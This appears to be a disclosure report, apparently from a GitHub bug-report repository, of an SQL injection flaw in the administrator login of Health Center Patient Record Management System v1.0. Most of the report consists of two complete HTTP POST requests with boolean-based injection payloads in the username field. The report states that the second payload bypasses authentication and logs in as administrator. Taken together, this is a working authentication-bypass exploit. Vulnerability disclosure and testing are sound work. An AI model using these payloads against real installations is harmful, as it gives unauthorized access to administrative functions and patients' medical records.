# Health Center Patient Record Management System v1.0 has SQL injection

BUG_Author: tangtangtang123456

Vulnerability File: /HCPMS/admin/login.php

POST parameter 'MULTIPART username', exists SQL injection vulnerability

Payload1:a' OR NOT 555=555#

```
POST /HCPMS/admin/login.php HTTP/1.1
Host: localhost
Content-Length: 345
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAqz3u58hZsnGERpB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/HCPMS/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=vrefpdn15a3e5ikfvutedkl3mp
Connection: close

------WebKitFormBoundaryAqz3u58hZsnGERpB
Content-Disposition: form-data; name="username"

a' OR NOT 555=555#
------WebKitFormBoundaryAqz3u58hZsnGERpB
Content-Disposition: form-data; name="password"

b
------WebKitFormBoundaryAqz3u58hZsnGERpB
Content-Disposition: form-data; name="login"


------WebKitFormBoundaryAqz3u58hZsnGERpB--
```

Invalid username or password

![image](https://github.com/tangtangtang123456/bug_report/blob/main/pictures/err.png)

Payload2:a' OR NOT 555=556#

```
POST /HCPMS/admin/login.php HTTP/1.1
Host: localhost
Content-Length: 345
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi9hja0imnN6Wx87P
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/HCPMS/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=vrefpdn15a3e5ikfvutedkl3mp
Connection: close

------WebKitFormBoundaryi9hja0imnN6Wx87P
Content-Disposition: form-data; name="username"

a' OR NOT 555=556#
------WebKitFormBoundaryi9hja0imnN6Wx87P
Content-Disposition: form-data; name="password"

b
------WebKitFormBoundaryi9hja0imnN6Wx87P
Content-Disposition: form-data; name="login"


------WebKitFormBoundaryi9hja0imnN6Wx87P--
```

Successfully logged in to the administrator background

![image](https://github.com/tangtangtang123456/bug_report/blob/main/pictures/right.png)
